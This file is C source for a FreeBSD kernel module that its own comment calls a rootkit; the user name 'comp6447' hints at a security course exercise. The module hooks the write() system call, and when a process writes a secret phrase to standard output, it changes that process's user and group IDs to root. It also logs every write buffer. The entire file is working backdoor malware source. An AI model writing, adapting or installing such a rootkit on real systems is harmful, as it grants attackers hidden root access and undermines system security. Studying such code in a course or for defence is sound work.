/*
    Load the rootkit in and run:
    echo "ticklemynuts" as user comp6447 and then see what happens...
*/

#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/uio.h>
#include <sys/malloc.h>
#include <sys/errno.h>
#include <sys/syslog.h>
#include <sys/libkern.h>

#define BUF_SIZE 100
#define ROOT_PHRASE "ticklemynuts"
#define PHRASE_LEN 12

static int write_hook(struct thread *td, void *args)
{
    int error = 0;
    struct write_args *w_args = (struct write_args *) args;
    struct proc *p = td->td_proc;

    char buf[BUF_SIZE] = {0};
    int done = 0;

    if (copyinstr(w_args->buf, buf, BUF_SIZE, &done) == 0){
        log(LOG_DEBUG, "Writing: %s\n", buf);
        if (w_args->fd == 1 && strncmp(buf, ROOT_PHRASE, PHRASE_LEN) == 0){
            if (p != NULL){
                struct ucred *u = p->p_ucred;

                if (u != NULL){
                    // change the user id to root(0)
                    u->cr_uid   = 0;
                    u->cr_ruid  = 0;
                    u->cr_svuid = 0;

                    // change the group id to root(0) as well
                    u->cr_rgid  = 0;
                    u->cr_svgid = 0;
                }
            }
        }
    }

    error = sys_write(td, args);

    return error;
}

static int load_handler(struct module *module, int cmd, void *arg)
{
    int error = 0;

    switch (cmd){
        case MOD_LOAD:
            log(LOG_DEBUG, "Hooking write(). ");
            sysent[SYS_write].sy_call = (sy_call_t *) write_hook;
            break;
        case MOD_UNLOAD:
            log(LOG_DEBUG, "Unhooking write(). ");
            sysent[SYS_write].sy_call = (sy_call_t *) sys_write;
            break;
        default:
            error = EOPNOTSUPP;
            break;
    }

    return error;
}

static moduledata_t rk_mod = {
    "priv_esc",   // module name
    load_handler,   // load function
    NULL
};

DECLARE_MODULE(priv_esc, rk_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
